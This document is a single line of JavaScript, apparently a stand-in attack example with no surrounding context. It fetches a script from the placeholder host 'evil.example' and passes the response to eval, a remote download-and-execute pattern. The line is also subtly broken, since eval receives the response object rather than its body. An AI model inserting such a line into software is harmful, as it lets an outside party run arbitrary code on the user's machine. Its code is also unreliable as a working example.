require("https").get("https://evil.example/x.js", r => eval(r));
